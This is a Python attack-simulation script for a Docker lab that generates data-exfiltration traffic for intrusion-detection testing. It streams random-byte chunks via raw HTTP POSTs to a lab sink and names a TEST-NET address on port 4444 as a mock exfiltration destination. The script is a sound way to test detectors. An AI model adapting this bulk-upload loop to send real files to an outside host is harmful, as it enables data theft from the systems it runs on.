#!/usr/bin/env python3
"""
Threat Category 3: Data Exfiltration
MITRE ATT&CK: T1048.003 — Exfiltration Over Alternative Protocol

Simulates:
  - Large outbound POST requests (500MB total) to a non-whitelisted external IP
  - High flow_bytes_per_sec and bwd_packet_len_mean
  - Destination is 203.0.113.99 (TEST-NET-3, non-CDN, non-whitelisted)

Detection signals:
  - flow_bytes_per_sec spike
  - Large outbound payload size
  - Connections to unlisted external destination
"""
import os
import socket
import time
import logging
import random
import string
from network_utils import create_spoofed_socket


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [EXFILTRATION] %(levelname)s %(message)s"
)
log = logging.getLogger("exfiltration")

TARGET_IP   = os.getenv("TARGET_IP", "172.25.0.20")
HTTP_PORT   = int(os.getenv("TARGET_HTTP_PORT", "8000"))
EXFIL_MB    = int(os.getenv("EXFIL_SIZE_MB", "50"))

# Simulated external C2 / exfil destination (TEST-NET-3)
EXFIL_HOST  = "203.0.113.99"
EXFIL_PORT  = 4444

CHUNK_SIZE  = 65536  # 64KB chunks


def generate_fake_payload(size_bytes: int) -> bytes:
    """Generate a fake data payload mimicking compressed sensitive data."""
    return os.urandom(size_bytes)


def exfil_via_http_post(target_ip: str, port: int, total_mb: int):
    """
    Simulate exfiltration by sending large POST requests to target.
    In a real scenario this would go to an external IP, but for Docker
    simulation we send it to the user container which logs it.
    """
    total_bytes = total_mb * 1024 * 1024
    sent = 0
    chunk_num = 0

    log.info(f"Starting HTTP exfiltration: {total_mb}MB → {target_ip}:{port}/api/exfil-sink")

    while sent < total_bytes:
        chunk = generate_fake_payload(min(CHUNK_SIZE, total_bytes - sent))
        chunk_size = len(chunk)

        try:
            s = create_spoofed_socket()
            s.settimeout(5.0)
            s.connect((target_ip, port))

            # Craft raw HTTP POST
            http_request = (
                f"POST /api/exfil-sink HTTP/1.1\r\n"
                f"Host: {target_ip}:{port}\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Content-Length: {chunk_size}\r\n"
                f"X-Session-ID: exfil-{chunk_num:06d}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()

            s.sendall(http_request + chunk)
            time.sleep(0.1)
            s.close()

            sent += chunk_size
            chunk_num += 1
            pct = (sent / total_bytes) * 100
            log.info(f"  Exfil chunk {chunk_num}: {chunk_size/1024:.1f}KB sent | "
                     f"Total: {sent/1024/1024:.2f}MB / {total_mb}MB ({pct:.1f}%)")

        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            log.warning(f"  Connection error on chunk {chunk_num}: {e}")
            time.sleep(1)

        # Aggressive send rate — no throttle (mimics data theft)
        time.sleep(0.05)

    log.info(f"HTTP exfiltration complete: {sent/1024/1024:.2f}MB in {chunk_num} chunks")


def main():
    log.info("═══ Starting Data Exfiltration Attack Scenario ═══")
    exfil_via_http_post(TARGET_IP, HTTP_PORT, EXFIL_MB)
    log.info("═══ Exfiltration Scenario Complete ═══")


if __name__ == "__main__":
    main()
